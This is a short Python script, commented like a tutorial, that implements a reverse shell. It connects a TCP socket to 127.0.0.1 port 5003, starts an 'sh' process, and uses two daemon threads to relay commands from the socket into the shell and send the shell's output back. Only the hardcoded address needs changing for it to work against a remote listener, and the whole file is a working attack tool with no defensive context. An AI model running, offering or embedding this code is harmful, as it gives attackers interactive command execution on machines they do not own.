# imports
import os,socket,subprocess,threading;

"""
Socket 2 proccess
Connects client to the server and reads up to 1024 bytes of data.
@param socket s
@param proccss p
"""
def s2p(s, p):
    while True:
        data = s.recv(1024) # read 1024 bytes of data from the socket.
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()


"""
Process to socket
Transfers data from a process's standard output to a socket, sending one byte at a time.
@param socket s
@param proccss p
"""
def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

# socket with address family internet and make it a TCP socket.
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",5003)) # connect to server

# Start a new shell process ('sh'), redirecting its stdout and stderr to the same pipe,
# and allowing interaction via stdin for sending commands.
p=subprocess.Popen(["sh"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

# Create and start a new thread to handle the transfer of data from the socket (s) to the process (p)
# using the s2p function, passing the socket and process as arguments. The thread is set as a daemon 
# so it will automatically terminate when the main program exits.
s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True  # Set the thread as a daemon (it will exit when the main program exits)
s2p_thread.start()  # Start the s2p thread

# Create and start a second thread to handle the transfer of data from the process (p) to the socket (s)
# using the p2s function, passing the socket and process as arguments. Like the first thread, it's also
# set as a daemon to ensure it terminates when the main program exits.
p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True  # Set the thread as a daemon
p2s_thread.start()  # Start the p2s thread

# Wait for the process (p) to finish execution. If a KeyboardInterrupt is raised (e.g., the user presses Ctrl+C),
# the socket (s) will be closed to clean up resources.
try:
    p.wait()  # Wait for the process to finish
except KeyboardInterrupt:  # Catch keyboard interrupt (Ctrl+C)
    s.close()  # Close the socket if interrupted